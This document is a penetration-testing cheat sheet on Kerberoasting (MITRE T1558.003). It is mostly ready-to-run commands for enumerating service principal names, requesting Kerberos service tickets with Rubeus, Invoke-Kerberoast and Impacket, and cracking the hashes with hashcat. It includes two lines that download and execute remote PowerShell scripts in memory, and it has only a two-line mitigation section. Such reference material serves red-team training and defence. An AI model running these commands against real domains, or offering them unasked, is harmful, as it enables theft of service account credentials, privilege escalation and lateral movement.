---
description: https://attack.mitre.org/techniques/T1558/003/
---

# Kerberoasting

**ATT\&CK ID:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/)

**Permissions Required:** <mark style="color:green;">**Valid Domain Account**</mark> | <mark style="color:orange;">**Ability to sniff domain traffic**</mark>

**Description**

Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force.

Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).

Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plain text credentials.

Cracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.

[\[Source\]](https://attack.mitre.org/techniques/T1558/003/)

## Enumeration

{% tabs %}
{% tab title="Windows" %}
CMD

```batch
# Gets all SPNs, Includes machine account SPNs
setspn -T [Domain] -Q */*
```

Powerview

```powershell
Get-DomainUser -SPN | Select SamAccountName,DisplayName,ServicePrincipalName
```

Get-SPNs

{% code overflow="wrap" %}
```powershell
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/RedTeam-Pentest-Tools/main/PowerShell/Get-SPNs.ps1")
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
{% endtab %}

{% tab title="Linux" %}
Impacket&#x20;

```python
GetUserSPNs.py [Domain]/[User]:<Password> -dc-ip [IP] -request
```
{% endtab %}
{% endtabs %}



## Exploitation

{% tabs %}
{% tab title="Windows" %}
Rubeus (Binary)

Documentation: [https://github.com/GhostPack/Rubeus#kerberoast](https://github.com/GhostPack/Rubeus#kerberoast)

```powershell
# Kerberoast all users in Domain and output to file
Rubeus.exe kerberoast /simple /outfile:C:\Temp\Kerbhashes.txt

# Kerberoast all users in alternative Domain
Rubeus.exe kerberoast /nowrap /domain:[Domain]

# Only kerberoast RC4 compatible types
Rubeus.exe kerberoast /nowrap /rc4opsec

# Only kerberoast AES compatible types
Rubeus.exe kerberoast /nowrap /aes

# Specific users
Rubeus.exe kerberoast /user:[User] /nowrap

# List statistics about found Kerberoastable accounts (Quiet)
Rubeus.exe kerberoast /stats
```

Rubeus (PowerShell)

```powershell
# Kerberoast all users in Domain and output to file
Invoke-Rubeus -Command "kerberoast /simple /outfile:C:\Temp\Kerbhashes.txt"

# Kerberoast all users in alternative Domain
Invoke-Rubeus -Command "kerberoast /nowrap /domain:[Domain]"

# Only kerberoast RC4 compatible types
Invoke-Rubeus -Command "kerberoast /nowrap /rc4opsec"

# Only kerberoast AES compatible types
Invoke-Rubeus -Command "kerberoast /nowrap /aes"

# Specific users
Invoke-Rubeus -Command "kerberoast /user:[User] /nowrap"

# List statistics about found Kerberoastable accounts (Quiet)
Invoke-Rubeus -Command "kerberoast /stats"

```

Invoke-Kerberoast

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong># Load into memory
</strong><strong>IEX(IWR https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1)
</strong>
# Standard Run
Invoke-Kerberoast | FL

# Dump only hashes in a file
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File "[Path]" -Encoding "ASCII"
</code></pre>
{% endtab %}

{% tab title="Linux" %}
Impacket

```python
GetUserSPNs.py [Domain]/[User]:<Password> -dc-ip [IP] -request
```

<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
{% endtab %}
{% endtabs %}

## Hash Cracking

```bash
hashcat -m 13100 -a 0 -O hashes.txt rockyou.txt -r rules.rule

etype           Value        Hashcat mode
AES128           17            19600
AES256           18            19700
RC4              23            13100
```

### Cracking time between RC4 and AES256 (Dictionary)

```powershell
# GTX 980
Wordlist:Rockyou Rule:Base64 - Total attempts (1 Billion)
AES256 (1 hour, 22 mins) /  RC4 (9 Seconds)

# GTX 980
Wordlist:rockyou2021 Rule:Base64 - Total attempts (651 Billion)
AES256 (36 Days) /  RC4 (1 Hour, 56 minutes)

# RTX 3090 x 2 + RTX3070
Wordlist:Rockyou Rule:Base64 - Total attempts (1 Billion)
AES256 (7 Minutes, 13 Seconds) /  RC4 (Instant)

# RTX 3090 x 2 + RTX3070
Wordlist:rockyou2021 Rule:Base64 - Total attempts (651 Billion)
AES256 (3 Days, 2 hours) /  RC4 (4 mins, 50 seconds)
```

### Cracking time between RC4 and AES256 (bruteforce)

```
// Some code
```

## Mitigation

* Ensure service account passwords are longer than 25 characters
* Make use of Group Service Managed Accounts (GMSA) where possible
